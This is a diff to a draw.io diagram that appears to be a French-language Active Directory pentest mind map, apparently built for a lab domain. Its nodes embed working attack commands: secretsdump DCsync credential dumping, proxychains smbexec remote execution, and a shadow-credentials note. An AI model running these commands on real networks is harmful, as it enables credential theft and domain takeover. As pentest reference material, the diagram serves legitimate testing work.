@@ -1499,6 +1499,9 @@
             <mxGeometry height="60" width="120" x="2206" y="2080" as="geometry" />
           </mxCell>
         </object>
+        <mxCell id="azW450O-uP_TH8X8SckY-1" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-39" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;" target="orcKsDgMiDMdKtN4nEvD-2">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="secretsdump -k -no-pass OLYMPIQUELYONNAIS.COM/&#39;DC01$&#39;@DC03.OLYMPIQUELYONNAIS.COM" id="ki_T6ywqn6y8RI7Xkelr-39">
           <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1">
             <mxGeometry height="60" width="120" x="2580" y="2079" as="geometry" />
@@ -1634,6 +1637,16 @@
         <object label="&lt;div&gt;&lt;font style=&quot;font-size: 16px;&quot;&gt;&lt;b&gt;Shadow credentials&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font style=&quot;font-size: 16px;&quot;&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;style&gt;a {&lt;br/&gt;    text-decoration: none;&lt;br/&gt;    color: #464feb;&lt;br/&gt;}tr th, tr td {&lt;br/&gt;    border: 1px solid #e6e6e6;&lt;br/&gt;}tr th {&lt;br/&gt;    background-color: #f5f5f5;&lt;br/&gt;}&lt;/style&gt;&lt;div style=&quot;font-family:&#39;Segoe UI&#39;;font-size:14px;font-style:normal;font-weight:400;line-height:20px&quot;&gt;Injection d’un couple clé publique/clé privée dans l’attribut &lt;code&gt;msDS-KeyCredentialLink&lt;/code&gt;.&lt;/div&gt;&lt;div style=&quot;font-family:&#39;Segoe UI&#39;;font-size:14px;font-style:normal;font-weight:400;line-height:20px&quot;&gt;&lt;style&gt;a {&lt;br/&gt;    text-decoration: none;&lt;br/&gt;    color: #464feb;&lt;br/&gt;}tr th, tr td {&lt;br/&gt;    border: 1px solid #e6e6e6;&lt;br/&gt;}tr th {&lt;br/&gt;    background-color: #f5f5f5;&lt;br/&gt;}&lt;/style&gt;&lt;div style=&quot;font-family:&#39;Segoe UI&#39;;font-size:14px;font-style:normal;font-weight:400;line-height:20px&quot;&gt;Permet ensuite de générer des tickets Kerberos pour le compte visé (TGT forgeable).&lt;/div&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;" ressource="https://www.login-securite.com/blog/attaques-sur-le-protocole-ntlmv1" id="LBzYc7lwx7GtCu901C92-1">
           <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;" vertex="1">
             <mxGeometry height="180" width="380" x="1530" y="2380" as="geometry" />
+          </mxCell>
+        </object>
+        <object label="&lt;div&gt;Proxy socks vers un autre DC&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;identique à un accès admin&amp;nbsp;&lt;/div&gt;" exec_cmd="proxychains smbexec.py -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; -debug" dump_creds="proxychains secretsdump -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39;" id="vugq5dWt0Ihu7lGKpSBT-1">
+          <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1">
+            <mxGeometry height="87" width="290" x="1590" y="1970" as="geometry" />
+          </mxCell>
+        </object>
+        <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" id="vugq5dWt0Ihu7lGKpSBT-2">
+          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=default;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1">
+            <mxGeometry height="60" width="120" x="1930" y="1972" as="geometry" />
           </mxCell>
         </object>
       </root>
